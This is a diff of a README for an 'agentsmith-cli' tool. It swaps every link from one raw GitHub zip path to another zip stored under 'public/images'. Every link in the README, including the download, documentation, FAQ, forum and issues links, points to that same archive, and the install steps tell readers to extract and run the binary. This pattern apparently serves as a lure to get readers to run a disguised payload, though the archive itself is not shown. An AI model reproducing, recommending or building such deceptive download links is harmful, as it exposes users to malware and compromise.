@@ -6,7 +6,7 @@ Welcome to agentsmith-cli! This tool transforms any GitHub repository into auton
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [Download agentsmith-cli](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip).
+To get started, you need to download the software. Visit this page to download: [Download agentsmith-cli](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip).
 
 ### Steps to Install:
 
@@ -16,7 +16,7 @@ To get started, you need to download the software. Visit this page to download: 
 4. Choose the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, you may find a `https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip` or a package format like `.deb`.
+   - For Linux, you may find a `https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip` or a package format like `.deb`.
 5. Once the download completes, locate the file on your computer.
 6. Follow these instructions based on your system:
 
@@ -30,7 +30,7 @@ To get started, you need to download the software. Visit this page to download: 
    - Open your Applications folder and double-click the agentsmith-cli icon.
 
    **For Linux:**
-   - Extract the contents of the `https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip` file.
+   - Extract the contents of the `https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip` file.
    - Open a terminal window.
    - Navigate to the extracted folder.
    - Run the application with the command: `./agentsmith-cli`.
@@ -71,9 +71,9 @@ After installing agentsmith-cli, you are ready to use it. Here are the basic ste
 
 For more detailed instructions on specific features, check our documentation:
 
-- [Getting Started Guide](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip)
-- [Feature Overview](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip)
-- [FAQ](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip)
+- [Getting Started Guide](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip)
+- [Feature Overview](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip)
+- [FAQ](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip)
 
 ## 🤝 Contributing
 
@@ -87,12 +87,12 @@ We welcome contributions to enhance agentsmith-cli. If you'd like to contribute,
 
 ## 📞 Support
 
-If you encounter any issues, feel free to reach out. You can open an issue in our GitHub repository, or use our [discussion forum](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip).
+If you encounter any issues, feel free to reach out. You can open an issue in our GitHub repository, or use our [discussion forum](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip).
 
 ## 🔗 Useful Links
 
-- [Release Page](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip)
-- [Issues](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/src/commands/cli-agentsmith-1.2.zip)
+- [Release Page](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip)
+- [Issues](https://raw.githubusercontent.com/Acelito7618/agentsmith-cli/main/public/images/agentsmith-cli-v2.2.zip)
 
 Now, go ahead and start transforming your GitHub repos into intelligent agents!
